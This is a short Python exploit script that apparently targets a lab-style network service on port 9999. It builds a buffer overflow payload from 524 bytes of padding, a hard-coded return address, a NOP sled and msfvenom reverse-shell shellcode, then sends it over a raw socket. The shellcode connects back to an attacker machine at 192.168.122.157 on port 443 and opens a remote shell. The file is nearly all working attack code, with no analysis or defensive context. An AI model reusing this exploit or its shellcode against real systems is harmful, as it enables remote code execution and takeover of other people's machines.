import socket

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.122.157 LPORT=443 -a x86 --platform linux -b '\x00' -f c
# 95 bytes
shellcode = (
"\xb8\xfa\x13\xbb\xd1\xdb\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x12\x83\xeb\xfc\x31\x43\x0e\x03\xb9\x1d\x59\x24\x0c\xf9\x6a"
"\x24\x3d\xbe\xc7\xc1\xc3\xc9\x09\xa5\xa5\x04\x49\x55\x70\x27"
"\x75\x97\x02\x0e\xf3\xde\x6a\x51\xab\x5b\xf7\x39\xae\x9b\x06"
"\x01\x27\x7a\xb8\x13\x68\x2c\xeb\x68\x8b\x47\xea\x42\x0c\x05"
"\x84\x32\x22\xd9\x3c\xa3\x13\x32\xde\x5a\xe5\xaf\x4c\xce\x7c"
"\xce\xc0\xfb\xb3\x91"
)

# ret 311712F3
buf = 'A' * 524			# offset 
buf += '\xf3\x12\x17\x31'	# ret
buf += '\x90'*16                # nops
buf += shellcode
buf += 'C'*(1000-524-4-16-95)

print("[*]sending %s bytes" % len(buf))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.122.177', 9999))
s.recv(1024)
s.send(buf + '\r\n')
s.close()
print("[*]Done")